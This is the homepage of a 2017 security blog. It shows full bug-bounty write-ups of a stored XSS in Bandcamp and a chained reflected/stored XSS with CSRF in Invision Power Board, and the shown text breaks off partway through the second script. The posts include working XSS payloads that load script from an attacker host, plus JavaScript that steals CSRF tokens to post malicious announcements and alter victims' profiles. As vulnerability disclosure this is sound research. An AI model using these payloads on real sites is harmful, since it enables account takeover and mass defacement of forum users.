<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  
  
  <title>sxcurity.pro</title>
  <meta name="description" content="Information Security blog by @sxcurity">
  

  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="http://hack-r.be:4000/">
  
  
  <link rel="alternate" type="application/rss+xml" title="sxcurity.pro" href="http://hack-r.be:4000/feed.xml">

  

  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:site" content="sxcurity">
  <meta name="twitter:title" content="sxcurity.pro">
  <meta name="twitter:description" content="Information Security blog by @sxcurity">
  
    <meta name="twitter:creator" content="sxcurity">
  
  

  <script type="text/javascript">
  WebFontConfig = {
    google: { families: [ 'Bitter:400,700,400italic:latin' ] }
  };
  (function() {
    var wf = document.createElement('script');
    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
    wf.type = 'text/javascript';
    wf.async = 'true';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(wf, s);
  })();
</script>

  

</head>


  <body>

    <header class="site-header" style="background-image: url(/images/coffee.jpg)">

  <div class="wrapper">
    <a class="site-title" style="text-decoration:none" href="/"><img height="30px" width="30px" src="/icon.svg"/>&nbsp;sxcurity.pro</a>

    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">[ About ]</a>
      
        
        <a class="page-link" href="/archives/">[ Archives ]</a>
      
        
        <a class="page-link" href="/advisories">[ Advisories ]</a>
      
    </nav>

  </div>

</header>


    <main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="home">
  

  

  <ul class="post-list">
    
      
      

      <li>
        <header class="post-header">
          <h1 class="post-title">
            <a class="post-link" href="/2017/11/24/H1-212-CTF/">H1-212 CTF Solution.pdf</a>
          </h1>

          <p class="post-meta">Nov 24, 2017</p>
        </header>

        <div class="post-content">
          <p><a href="/H1-212 CTF Solution.pdf" rel="noopener noreferrer" style="color:#DC0739;">H1-212 CTF Solution.pdf</a></p>


        </div>
        
      </li>
    
      
      

      <li>
        <header class="post-header">
          <h1 class="post-title">
            <a class="post-link" href="/2017/10/05/xcart-rce/">PHP Code Injection in X-Cart v5.2.23 / 5.3.1.9 / 5.3.2.13 / 5.3.3</a>
          </h1>

          <p class="post-meta">Oct 5, 2017</p>
        </header>

        <div class="post-content">
          <p><a href="PHP Code Injection in X-Cart.pdf" rel="noopener noreferrer" style="color:#DC0739;">PHP Code Injection in X-Cart.pdf</a></p>


        </div>
        
      </li>
    
      
      

      <li>
        <header class="post-header">
          <h1 class="post-title">
            <a class="post-link" href="/2017/06/30/bandcamp-xss/">Stored XSS in BandCamp</a>
          </h1>

          <p class="post-meta">Jun 30, 2017</p>
        </header>

        <div class="post-content">
          <p>        Recently, while my friend <a href="https://twitter.com/_psycho_mantis" rel="noopener noreferrer" style="color:#DC0739;text-decoration:none;"><b>Alyssa Herrera</b></a> and I were collaborating on finding ffmpeg vulnerabilities in bug bounty programs, we came to learn that <strong>Bandcamp</strong> ran a bug bounty program. If you have never heard of BandCamp, it is essentially a platform that allows artists, fans, and labels to interact, connect, and support each other.</p>

<p>I instantly was curious to see what I could find, so I signed up for an artist account and created a Bandcamp page. The first function I started to test was the <strong>Add Music</strong> function. This part of the site allows artists to add albums and tracks. I tested for IDOR and XSS, but sadly it wasn’t vulnerable to either.</p>

<p>The next function I thought I wanted to test was the <strong>Add Merch</strong> function. There were 2 main parameters in this function that I wanted to test for XSS in immediately. I wanted to see if either the <em>Item Title</em> or <em>Description</em> accepted / rendered any HTML.
I put in a simple XSS payload for both:  <code class="highlighter-rouge">&lt;svg/onload=confirm(0)&gt;</code></p>

<p>I saved and published the new “merchandise”, and voila:
NOTHING happened. It was sanitized and I was bummed that it didn’t work.
Then I saw the <strong>Buy Now</strong> button, so I clicked it, which opened a new frame and my XSS fired! They were not correctly sanitizing the <strong>Item Title</strong> in this frame, thus allowing an attacker to simply insert any HTML or javascript.</p>

<p>I am always reluctant in submitting an XSS with merely alert() because it just shows I was too lazy to actually come up with a cool proof-of-concept. 
With that in mind, I came up with this POC:</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">alert</span><span class="p">(</span><span class="s2">"Stored XSS on BandCamp"</span><span class="p">);</span>
<span class="nx">alert</span><span class="p">(</span><span class="s2">"Your cookies: "</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"follow-unfollow"</span><span class="p">).</span><span class="nx">click</span><span class="p">();</span><span class="nx">alert</span><span class="p">(</span><span class="s2">"Thanks for the follow :^D"</span><span class="p">);</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s2">"hacker=cdl;path=/;domain=.bandcamp.com"</span><span class="p">;</span>  
</code></pre></div></div>
<p>Then changed the <strong>Item Title</strong> to <code class="highlighter-rouge">&lt;script src=//sxcurity.pro/bandcamp.js&gt;&lt;/script&gt;</code>
which made the victim follow me and set the cookie “hacker” to “cdl” for bandcamp.com and all subdomains in their browser!
<br />Proof of concept video:</p>
<iframe src="https://player.vimeo.com/video/224109910" width="640" height="360" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>
<p><br /></p>
<h2><u>Timeline</u></h2>
<ul>
  <li>(6/29/2017) Reported XSS to Bandcamp via Email</li>
  <li>(6/30/2017) Confirmed, Patched, &amp; Awarded with a $500 bounty!</li>
</ul>

<p><br />
Thanks for reading,<br /><br />
<strong>Corben Douglas</strong> (<font color="#E22A3C">@sxcurity</font>)</p>
<ul>
  <li>https://hackerone.com/cdl</li>
  <li>https://twitter.com/sxcurity</li>
  <li>https://bugcrowd.com/c</li>
  <li>https://github.com/sxcurity</li>
</ul>

        </div>
        
      </li>
    
      
      

      <li>
        <header class="post-header">
          <h1 class="post-title">
            <a class="post-link" href="/2017/05/28/pulse-connect-secure/">Multiple XSS &amp; CSRF in Pulse Connect Secure v8.3R1</a>
          </h1>

          <p class="post-meta">May 28, 2017</p>
        </header>

        <div class="post-content">
          <p><a href="/Multiple XSS and CSRF in Pulse Connect Secure v8.3R1.pdf" rel="noopener noreferrer" style="color:#DC0739;">Multiple XSS and CSRF in Pulse Connect Secure v8.3R1.pdf</a></p>


        </div>
        
      </li>
    
      
      

      <li>
        <header class="post-header">
          <h1 class="post-title">
            <a class="post-link" href="/2017/05/09/ipb-xss/">Reflected and Stored XSS in Invision Power Board</a>
          </h1>

          <p class="post-meta">May 9, 2017</p>
        </header>

        <div class="post-content">
          <p>        <a href="https://en.wikipedia.org/wiki/Invision_Power_Board" style="text-decoration:none;color:#DC0739">Invision Power Board</a> is a very popular paid forum software. I decided to audit it and initially found a few stored XSS vulnerabilities in the admin panel, all had a low impact, so I didn’t report them. Then I came across the <strong>Announcements</strong> function in the Moderator Control Panel. Essentially this function allows moderators and admins to create an forum announcement for every user to see, and it also allowed any HTML in it!<br />
        If I had access to a <strong>moderator</strong> account or higher, I could easily put an XSS payload in an annoucement and attack everyone. I obviously wasn’t satisfied so I kept searching for another bug to chain it with.
<br /><br />
        I eventually came across the IPS UTF8 Converter, when I was using find &amp; grep to find different variables in the source code. This tool, which comes with the default installation, is used to convert all the tables in the database to UTF-8. I opened up the path to the converter <code class="highlighter-rouge">admin/convertutf8/index.php</code>  and quickly got an error message. I was pretty bummed because I was initally looking into an RCE, but came up empty. But then I saw the <code class="highlighter-rouge">controller=</code> parameter. I checked the source of the page and saw that this parameter was not sanitizing any input at all and that I could insert HTML and javascript here, no authentication required! My first proof of concept was just a simple payload =&gt;  <code class="highlighter-rouge">%29};alert(document.domain);{ %27</code>
<br /><br />
Most times when people report an XSS or do a write up, they just use an <code class="highlighter-rouge">alert(1)</code> and just give a hypothetical attack. I didn’t want to do that with this one. I really wanted to weaponize this as much as possible (and in a fun way), so I coded a couple scripts to do just that! 
<br /><br />
The first script I coded was: http://www.sxcurity.pro/pocs/xss.js</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 _
(_)_ ____      ___ __
| | '_ \ \ /\ / / '_ \
| | |_) \ V  V /| | | |
|_| .__/ \_/\_/ |_| |_|
 |_|  IPB Exploit
      by @sxcurity
*/</span>

<span class="c1">// specifies the target, the title of the announcement, and the xss payload!</span>
<span class="kd">var</span> <span class="nx">target</span> <span class="o">=</span> <span class="s1">'http://&lt;target&gt;/index.php?/modcp/announcements/&amp;action=create'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">title</span> <span class="o">=</span> <span class="s1">'URGENT'</span><span class="p">;</span>

<span class="c1">// Don't use quotes! It'll break our form down below!</span>
<span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="s1">'&lt;script src=//&lt;ATTACKER&gt;/lol.js&gt;&lt;/script&gt;'</span><span class="p">;</span>

<span class="c1">// steals the csrf token ;)</span>
<span class="kd">var</span> <span class="nx">cdl</span> <span class="o">=</span> <span class="kd">get</span><span class="p">(</span><span class="nx">target</span><span class="p">);</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">cdl</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">form</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)[</span><span class="mi">3</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">form</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>

<span class="c1">// DON'T EDIT!!</span>
<span class="c1">// Gets the current date! Thanks stackoverflow</span>
<span class="kd">var</span> <span class="nx">today</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">dd</span> <span class="o">=</span> <span class="nx">today</span><span class="p">.</span><span class="nx">getDate</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">mm</span> <span class="o">=</span> <span class="nx">today</span><span class="p">.</span><span class="nx">getMonth</span><span class="p">()</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span> <span class="c1">//January is 0!</span>
<span class="kd">var</span> <span class="nx">yyyy</span> <span class="o">=</span> <span class="nx">today</span><span class="p">.</span><span class="nx">getFullYear</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="nx">dd</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">){</span>
    <span class="nx">dd</span><span class="o">=</span><span class="s1">'0'</span><span class="o">+</span><span class="nx">dd</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="nx">mm</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">){</span>
    <span class="nx">mm</span><span class="o">=</span><span class="s1">'0'</span><span class="o">+</span><span class="nx">mm</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">today</span> <span class="o">=</span> <span class="nx">mm</span><span class="o">+</span><span class="s1">'/'</span><span class="o">+</span><span class="nx">dd</span><span class="o">+</span><span class="s1">'/'</span><span class="o">+</span><span class="nx">yyyy</span><span class="p">;</span>

<span class="c1">// build form with valid token and evil credentials</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span>
  <span class="o">+=</span> <span class="s1">'&lt;form id="sxcurity" action="'</span> <span class="o">+</span> <span class="nx">target</span> <span class="o">+</span> <span class="s1">'" method="POST"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="_submitted" value="1"&gt;'</span>
  <span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="csrfKey" value="'</span> <span class="o">+</span> <span class="nx">token</span> <span class="o">+</span> <span class="s1">'"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="MAX_FILE_SIZE" value="2097152"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="plupload" value="sxcurity"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_title" value="'</span> <span class="o">+</span> <span class="nx">title</span> <span class="o">+</span> <span class="s1">'"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_start" value="'</span> <span class="o">+</span> <span class="nx">today</span> <span class="o">+</span><span class="s1">'"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_end_unlimited" value="0"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_content" value="'</span><span class="o">+</span> <span class="nx">payload</span> <span class="o">+</span><span class="s1">'"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_content_upload" value="sxcurity"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_app_unlimited" value="*"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_calendars"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_calendars-zeroVal" value="on"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_download_categories"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_download_categories-zeroVal" value="on"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_forums"&gt;'</span>
	<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="announce_forums-zeroVal" value="on"&gt;'</span>
  <span class="o">+</span> <span class="s1">'&lt;/form&gt;'</span><span class="p">;</span>

<span class="c1">// submits our csrf form!</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="s2">"sxcurity"</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>

<span class="kd">function</span> <span class="kd">get</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">xmlHttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"GET"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
    <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>It requires a moderator or admin to visit (not too hard to do). Once they visit it, it creates an announcement abusing the first bug I found, thus chaining this reflected XSS with the stored one. It does this by stealing the moderator’s / admin’s CSRF token, builds a CSRF form with that token &amp; with the HTML we want to be in the announcement, and then submits the form, creating our malicious announcement :) <br /><br />
Payload: <code class="highlighter-rouge">controller='};&lt;/script&gt;&lt;script src=//&lt;attacker&gt;/xss.js&gt;&lt;/script&gt;;{' </code></p>

<p>The second script I coded was: http://www.sxcurity.pro/pocs/lol.js</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
www.sxcurity.pro/pocs/lol.js
 _
(_)_ ____      ___ __
| | '_ \ \ /\ / / '_ \
| | |_) \ V  V /| | | |
|_| .__/ \_/\_/ |_| |_|
 |_|  IPB Exploit
      by @sxcurity

index.php?/profile/&lt;user&gt;/&amp;tab=field_core_pfield_1
This will add "sxcurity is my hero" to the user's about me.
*/</span>
<span class="kd">var</span> <span class="nx">target</span> <span class="o">=</span> <span class="s1">'http://localhost/ips_4141/index.php'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="s1">'sxcurity is my hero'</span><span class="p">;</span>

<span class="c1">// Gets the Profile URL of the victim.</span>
<span class="kd">var</span> <span class="nx">cdl</span> <span class="o">=</span> <span class="kd">get</span><span class="p">(</span><span class="nx">target</span><span class="p">);</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">cdl</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">user_url</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">13</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">user_url1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">14</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">user_url2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">15</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">user_url3</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">16</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">user_url4</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">17</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">user_url5</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">18</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">user_url6</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">19</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">user_url7</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">20</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">yay</span> <span class="o">=</span> <span class="nx">user_url</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">yay1</span> <span class="o">=</span> <span class="nx">user_url1</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">yay2</span> <span class="o">=</span> <span class="nx">user_url2</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">yay3</span> <span class="o">=</span> <span class="nx">user_url3</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">yay4</span> <span class="o">=</span> <span class="nx">user_url4</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">yay5</span> <span class="o">=</span> <span class="nx">user_url5</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">yay6</span> <span class="o">=</span> <span class="nx">user_url6</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">yay7</span> <span class="o">=</span> <span class="nx">user_url7</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">mod_check0</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">22</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">mod_check1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">22</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">mod_check2</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">23</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">mod_check3</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">24</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">mod_check4</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">25</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">mod_check5</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">26</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">mod_check6</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'a'</span><span class="p">)[</span><span class="mi">27</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">check0</span> <span class="o">=</span> <span class="nx">mod_check1</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">check1</span> <span class="o">=</span> <span class="nx">mod_check1</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">check2</span> <span class="o">=</span> <span class="nx">mod_check2</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">check3</span> <span class="o">=</span> <span class="nx">mod_check3</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">check4</span> <span class="o">=</span> <span class="nx">mod_check4</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">check5</span> <span class="o">=</span> <span class="nx">mod_check5</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">check6</span> <span class="o">=</span> <span class="nx">mod_check5</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>


<span class="cm">/*
Mods / admins have a different amount of links before their profile URL, so this makes sure
we grab the right profile URL and not some random one!
*/</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">yay</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = normal user acc.</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay1</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = normal user acc.</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay1</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay2</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = normal user acc.</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay2</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay3</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = normal user acc.</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay3</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay4</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = normal user acc.</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay4</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay5</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = normal user acc.</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay5</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay6</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = normal user acc.</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay6</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">yay7</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = normal user acc.</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">yay7</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">check0</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = mod or admin</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">check0</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">check2</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = mod or admin</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">check2</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">check3</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = mod or admin</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">check3</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">check4</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = mod or admin</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">check4</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">check5</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = mod or admin</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">check5</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">check6</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">"profile"</span><span class="p">)){</span>
  <span class="c1">//user = mod or admin</span>
  <span class="kd">var</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">check6</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="kr">final</span> <span class="o">=</span> <span class="nx">profile</span> <span class="o">+</span> <span class="s1">'edit/'</span><span class="p">;</span>

<span class="c1">// steals the csrf token</span>

<span class="kd">var</span> <span class="nx">csrf</span> <span class="o">=</span> <span class="kd">get</span><span class="p">(</span><span class="kr">final</span><span class="p">);</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">csrf</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">inp</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">'input'</span><span class="p">)[</span><span class="mi">3</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">inp</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>

<span class="c1">// build form with valid token and evil credentials</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span>
<span class="o">+=</span> <span class="s1">'&lt;form id="woot" action='</span> <span class="o">+</span> <span class="kr">final</span> <span class="o">+</span> <span class="s1">' method="POST"&gt;'</span>
<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="form_submitted" value="1"&gt;'</span>
<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="csrfKey" value="'</span> <span class="o">+</span> <span class="nx">token</span> <span class="o">+</span> <span class="s1">'"&gt;'</span>
<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="MAX_FILE_SIZE" value="2097152"&gt;'</span>
<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="plupload" value="sxcurity"&gt;'</span>
<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="bday[month]" value="0"&gt;'</span>
<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="bday[day]" value="0"&gt;'</span>
<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="bday[year]" value="0"&gt;'</span>
<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="enable_status_updates" value="0"&gt;'</span>
